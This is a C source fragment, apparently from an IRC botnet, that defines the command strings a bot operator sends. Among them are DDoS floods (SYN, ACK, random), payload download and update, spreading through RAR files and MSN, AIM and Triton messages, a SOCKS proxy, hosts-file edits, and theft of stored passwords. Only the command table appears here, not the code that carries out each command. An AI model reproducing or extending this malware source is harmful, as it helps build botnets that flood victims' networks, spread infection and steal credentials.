#ifndef NO_DOWNLOAD
const char get_mnd1[]			= "yo-dl";
const char get_mnd2[]			= "yo-dll";
const char get_upd1[]			= "yo-new";
const char get_upd2[]			= "yo-up";
#endif

#ifndef NO_DDOS
const char cmd_ddos_syn[]		= "ddos.syn";
const char cmd_ddos_ack[]		= "ddos.ack";
const char cmd_ddos_random[]	= "ddos.random";
const char cmd_ddos_stop[]      = "ddos.stop";
#endif

#ifndef NO_SUPERSYN
const char cmd_ddos_supersyn[]	= "ddos.supersyn";
#endif

const char cmd_rarspread_1[]     = "inject";
#ifndef NO_SOCKS4
const char cmd_socks4_1[]		= "socks";
const char cmd_socks4_2[]		= "socks4";
const char cmd_socks4_3[]       = "socks.stop";
#endif

const char get_auth1[]			= "yo-login";
const char get_auth2[]			= "l";
	
const char cmd_remove_1[]		= "yo-r3m";
const char cmd_remove_2[]		= "yo-r3m0v31";
const char cmd_hostdel[]		= "host.del";
const char cmd_hostadd[]		= "host.add";
#ifndef NO_VISIT
const char cmd_visit[]			= "visit";
const char cmd_navegar[]		= "navegar";
#endif

#ifndef NO_SEED
const char cmd_seed[]			= "utorrent.seed";
#endif

const char cmd_fake_remove[]    = "remove";
const char cmd_fakedownload[]   = "download";
const char cmd_fakeupdate[]     = "update";

const char cmd_imspread_1[]		= "msg.msg";
const char cmd_imspread_2[]		= "msg.stop";
const char cmd_imspread_3[]     = "msn.add";

const char cmd_aimspread_1[]    = "aim.msg";
const char cmd_aimspread_2[]    = "aim.stop";

const char cmd_timspread_1[]    = "triton.msg";
const char cmd_timspread_2[]    = "triton.stop";

#ifndef NO_PSTORE
const char cmd_pstore_1[]		= "pstore";
const char cmd_pstore_2[]		= "pstore.search";
#endif

const char cmd_threads_1[]		= "threads"; /**********/
const char cmd_threads_2[]		= "t";       /**********/
const char cmd_threads_sub[]	= "sub";     /*UNUSED!!*/
const char cmd_threads_kill_1[]	= "kill";    /**********/
const char cmd_threads_kill_2[]	= "k";       /**********/

const char cmd_join_1[]			= "join";
const char cmd_join_2[]			= "j";

const char cmd_part_1[]			= "part";
const char cmd_part_2[]			= "p";
